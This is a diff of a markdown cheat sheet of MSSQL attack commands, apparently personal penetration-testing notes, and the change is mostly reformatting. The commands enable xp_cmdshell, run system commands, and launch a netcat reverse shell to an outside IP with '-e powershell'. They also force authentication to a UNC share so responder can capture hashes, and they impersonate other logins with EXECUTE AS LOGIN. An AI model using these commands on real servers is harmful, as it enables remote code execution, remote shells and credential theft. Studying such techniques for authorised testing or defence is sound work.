@@ -135,15 +135,12 @@ username/username
 
 `select * from   <DB name>.INFORMATION_SCHEMA.TABLES  #show tables`
 
-#cmd command	
+> cmd command	
 
-`EXEC sp_configure 'show advanced options', 1;`
-
-`RECONFIGURE;`
-
-`EXEC sp_configure 'xp_cmdshell', 1;`
-
-`RECONFIGURE;`
+`EXEC sp_configure 'show advanced options', 1;`<br>
+`RECONFIGURE;`<br>
+`EXEC sp_configure 'xp_cmdshell', 1;`<br>
+`RECONFIGURE;`<br>
 
 `EXEC xp_cmdshell ' whoami /priv '`
 
@@ -153,14 +150,14 @@ username/username
 
 `xp_cmdshell "/windows/temp/nc64.exe 10.10.149.147 1234 -e powershell"`
 	
-hash capture
+> hash capture
 
 `xp_dirtree \\192.168.1.210\shared`
 
 `responder -I tun0   #When the SQL service is running under a machine account, the authentication process returns the machine account hash, which is not crackable (e.g., $DC)`
 
 
-`enum_impersonate  #impersonate`
+`enum_impersonate'  > impersonate
 
 `EXECUTE AS LOGIN = 'username to impersonate'  #impersonate`
 
